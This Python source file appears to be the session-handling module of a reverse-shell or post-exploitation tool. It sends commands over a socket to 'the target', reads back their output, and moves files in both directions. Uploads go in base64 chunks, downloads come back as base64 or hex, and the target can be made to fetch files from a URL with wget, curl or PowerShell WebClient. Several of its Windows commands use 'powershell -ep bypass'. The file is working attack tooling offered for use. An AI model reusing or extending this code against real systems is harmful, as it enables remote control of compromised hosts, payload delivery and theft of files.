import re
import time
import base64
from shell_utils.shell_factory import ShellTypes
from utils.print_utils import Printer
from utils.pwsh_utils import ObfUtil
from queue import Queue, Empty
from enum import Enum, auto
from os.path import isfile, basename, join

class FileMode(Enum):
    Append = auto()
    Create = auto()

class SessionExec(object):
    """
    SessionExec is the class allowing us to execute command on the target and recover the result
    The result will be stored in our waiting queue
    """
    def __init__(self, con):
        self.socket = con
        self.answer_queue = Queue()
        self.maker = CmdMaker()
        self.is_waiting = False

    def exec(
            self,
            cmd,
            timeout=5,
            get_all=True,
            hide_error=False,
            shell_type=None
        ):

        self.is_waiting = True

        res = ""
        full_res = None

        self.maker.init_command(cmd)
        if(shell_type is not None):
            self.maker.with_shell_type(shell_type)

        if(hide_error):
            self.maker.hide_error()

        if(get_all):
            self.maker.surround()

        cmd = self.maker.end().get_command()

        self.socket.send(cmd)
        try:
            if not(get_all):
                res = self.answer_queue.get(timeout=timeout)

            else:
                while True:
                    res += self.answer_queue.get(timeout=timeout)

                    if re.match(CmdMaker.PatternForResult, res) is not None:
                        full_res = res.split("=====")[-2].lstrip(';')
                        if not(self.maker.command_origin.strip() in full_res.strip()):
                            break

                        else:
                            res = ""

                    # full_res = re.findall(res_pattern, res)
                    # if(full_res and not(self.maker.command_origin.strip() in full_res[-1])):
                    #     break

        except Empty:
            pass

        finally:
            self.is_waiting = False

        if(get_all and full_res):
            return full_res.strip()

        return res.strip()

    def exec_no_result(self, cmd, shell_type=ShellTypes.Basic):
        cmd = self.maker.init_command(cmd).with_shell_type(shell_type).end().get_command()
        self.socket.send(cmd)

    def exec_all_no_result(self, list_cmd, shell_type, wait=0):
        for c in list_cmd:
            self.exec_no_result(c, shell_type)
            if(wait != 0):
                time.sleep(wait)

    def write_chunk_to_file(self, file, chunk, shell_type, mode):
        if(type(chunk) == str):
            chunk = chunk.encode()
        chunk_encoded = base64.b64encode(chunk)
        cmd = self.maker.init_command(chunk_encoded).with_shell_type(shell_type).decode_b64_command().redirect_output_to_file(file, mode).end().get_command()
        self.exec_no_result(cmd)
        time.sleep(0.1)

    def upload(self, file, where, shell_type):
        if(not(isfile(file))):
            Printer.err(f"File {file} does not exists")

        else:
            chunk_size = 512
            content = []
            with open(file, 'rb') as f:
                while True:
                    data = f.read(chunk_size)
                    if(not(data)):
                        break
                    content.append(data)

            for i in range(len(content)):
                mode = FileMode.Create if(i == 0) else FileMode.Append
                Printer.log(f"Uploading chunk {i} on {len(content)}  ", end="\r")
                self.write_chunk_to_file(where, content[i], shell_type, mode)

            Printer.log("Done")

    def upload_http(self, http_link, where, shell_type, available_bin):
        cmd = self.maker.with_shell_type(shell_type).download_from(http_link, where, available_bin).end().get_command()
        self.exec(cmd, timeout=2, shell_type=shell_type)

    def download(self, file, download_directory, shell_type, available_bin):
        self.maker.init_command(file).with_shell_type(shell_type)
        file_content = b""
        if(shell_type in [ShellTypes.Basic, ShellTypes.Pty]):
            if('base64' in available_bin):
                b64_file_content = self.download_base64(file, shell_type)
                file_content = base64.b64decode(b64_file_content.encode())

            elif('xxd' in available_bin):
                hex_file_content = self.download_hex(file, shell_type)
                file_content = bytes.fromhex(hex_file_content.replace("\n", ""))

        else:
            if("download" in available_bin):
                hex_file_content_powershell = self.exec(f'download "{file}"', timeout=2.5, get_all=True)
                file_content = bytes.fromhex(hex_file_content_powershell)
                
            else:
                Printer.err("[i]download[/i] function is [red]not available[/red] on target")

        if(file_content != b""):
            destination = join(download_directory, basename(file))
            Printer.msg(f"Saving file in [dodger_blue1]{destination}[/dodger_blue1]")

            with open(destination, 'wb') as f:
                f.write(file_content)

        else:
            Printer.err(f"No result found for file [dodger_blue1]{file}[/dodger_blue1]")


    def download_hex(self, file, shell_type):
        cmd = self.maker.to_hex().get_command()
        file_content = self.exec(cmd, timeout=2, shell_type=shell_type)
        return file_content

    def download_base64(self, file, shell_type):
        cmd = self.maker.to_b64().get_command()
        file_content = self.exec(cmd, timeout=2, shell_type=shell_type)
        return file_content


class CmdMaker:
    """
    Class responsible for parsing and establishing the command
    The command must be str each time, but at the end it will be bytes
    """

    Delimiter = "echo \"=====\""
    PatternForResult = re.compile(r'.*=====(.*?)=====', re.DOTALL)

    def __init__(self, cmd="", shell_type=ShellTypes.Basic):
        self._command_origin = cmd
        self._cmd = cmd
        self.shell_type = shell_type

    @property
    def command_origin(self):
        if(type(self._command_origin) == bytes):
            return self._command_origin.decode('utf-8', 'ignore')
        return self._command_origin

    def command_to_byte(self):
        if(type(self._cmd) == str):
            self._cmd = self._cmd.encode()
        return self

    def command_to_string(self):
        if(type(self._cmd) == bytes):
            self._cmd = self._cmd.decode("utf-8", "ignore")
        return self

    def init_command(self, command):
        self._command_origin = command
        self._cmd = command
        self.command_to_string()
        return self

    def surround(self):
        """This function surround the command with delimiter to help finding the result"""
        join = CmdUtils.get_joiner_for_command(self.shell_type)
        self._cmd = CmdUtils.isolate_command(self._cmd, self.shell_type)
        self._cmd = f"{CmdMaker.Delimiter} {join} {self._cmd} {join} {CmdMaker.Delimiter}"
        return self

    def show_error(self):
        self._cmd = f"{self._cmd} 2>&1"
        return self

    def hide_error(self):
        self._cmd = CmdUtils.get_error_catcher(self._cmd, self.shell_type)
        return self

    def crlf(self):
        self._cmd += "\n"
        return self

    def decode_b64_command(self):
        self._cmd = CmdUtils.get_b64_decode_command(self._cmd, self.shell_type)
        return self

    def redirect_output_to_file(self, file, mode):
        self._cmd = CmdUtils.output_to_file(file, self._cmd, mode, self.shell_type)
        return self

    def with_shell_type(self, shell):
        self.shell_type = shell
        return self

    def end(self, with_crlf=True):
        if(with_crlf):
            self.crlf()
        self.command_to_byte()
        return self

    def get_command(self):
        return self._cmd

    def to_b64(self):
        self._cmd = CmdUtils.file_to_base64(self._cmd, self.shell_type)
        return self

    def to_hex(self):
        self._cmd = CmdUtils.file_to_hex(self._cmd, self.shell_type)
        return self

    def download_from(self, http_link, where, available_bin):
        if(CmdUtils.is_download_available(self.shell_type, available_bin)):
            self._cmd = CmdUtils.get_command_for_download(self.shell_type, http_link, where, available_bin)
        else:
            raise Exception("Cannot download via http, use file write")

        return self

class CmdUtils:
    """
    CmdUtils is a class that has knowledge about differences between command, in function of the OS (shell used) 
    """
    @staticmethod
    def get_joiner_for_command(shell_type):
        if(shell_type == ShellTypes.Windows):
            return "&"
        return ";"

    @staticmethod
    def isolate_command(cmd, shell_type):
        if(shell_type is ShellTypes.Powershell):
            return cmd
        return f'({cmd})'

    @staticmethod
    def get_error_catcher(command, shell_type):
        if(shell_type == ShellTypes.Windows):
            return f'({command}) 2> nul'
        elif(shell_type == ShellTypes.Powershell):
            return 'try{ ' + command + ' }catch{}'
        else:
            return f'({command}) 2>/dev/null'

    @staticmethod
    def get_b64_decode_command(command, shell_type):
        if(shell_type is ShellTypes.Powershell):
            return f'[System.Convert]::FromBase64String("{command}")'

        elif(shell_type is ShellTypes.Windows):
            return f'powershell -ep bypass -c "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\\"{command}\\"))"'

        else:
            return f"echo \"{command}\" | base64 -d"


    @staticmethod
    def output_to_file(filename, command, mode, shell_type):
        if(shell_type is ShellTypes.Powershell):
            output = f"[IO.File]::WriteAllBytes(\"{filename}\", "
            if(mode == FileMode.Append):
                output += f"[IO.File]::ReadAllBytes(\"{filename}\") + "
            output += f"{command})"
            return output

        else:
            if(mode == FileMode.Append):
                output = f"({command}) >> {filename}"
            else:
                output = f"({command}) > {filename}"
            return output


    @staticmethod
    def get_command_for_download(shell_type, http_link, where, available_bin):
        if(shell_type is ShellTypes.Powershell):
            return f'(new-object system.net.webclient).downloadfile("{http_link}", "{where}")'

        elif(shell_type is ShellTypes.Windows):
            if("curl" in available_bin):
                return f'curl "{http_link}" -o "{where}"'
            return f'powershell -ep bypass -c "(new-object system.net.webclient).downloadfile(\\"{http_link}\\", \\"{where}\\");"'

        else:
            if("wget" in available_bin):
                return f"wget '{http_link}' -O {where}"

            elif("curl" in available_bin):
                return f"curl '{http_link}' -o {where}"

            else:
                raise Exception("No binaries found for download, despite the download seems available")

    @staticmethod
    def file_to_base64(filename, shell_type):
        if(shell_type is ShellTypes.Basic or shell_type == ShellTypes.Pty):
            return f"[ -f \"{filename}\" ] && base64 {filename} -w 0 && echo "
        elif(shell_type is ShellTypes.Powershell):
            return f'if(Test-Path "{filename}"){{$bytes = [System.IO.File]::ReadAllBytes("{filename}");[System.Convert]::ToBase64String($bytes)}}'
        elif(shell_type is ShellTypes.Windows):
            return f'powershell -ep bypass -c "if(Test-Path \\"{filename}\\"){{$bytes = [System.IO.File]::ReadAllBytes(\'{filename}\');[System.Convert]::ToBase64String($bytes)}}"'
        return None

    @staticmethod
    def file_to_hex(filename, shell_type):
        if(shell_type is ShellTypes.Basic or shell_type == ShellTypes.Pty):
            return f"[ -f \"{filename}\" ] && xxd -p {filename}"
        elif(shell_type is ShellTypes.Powershell):
            return f'if(Test-Path "{filename}"){{$bytes = [System.IO.File]::ReadAllBytes("{filename}");[System.BitConverter]::ToString($bytes).Replace("-","")}}'
        elif(shell_type is ShellTypes.Windows):
            return f'powershell -ep bypass -c "if(Test-Path \\"{filename}\\"){{$bytes = [System.IO.File]::ReadAllBytes(\'{filename}\');[System.BitConverter]::ToString($bytes).Replace(\'-\',\'\')}}"'
        return None

    @staticmethod
    def is_download_available(shell_type, available_bin):
        if(shell_type in [ShellTypes.Basic, ShellTypes.Pty]):
            return ("wget" in available_bin or "curl" in available_bin)
        return True
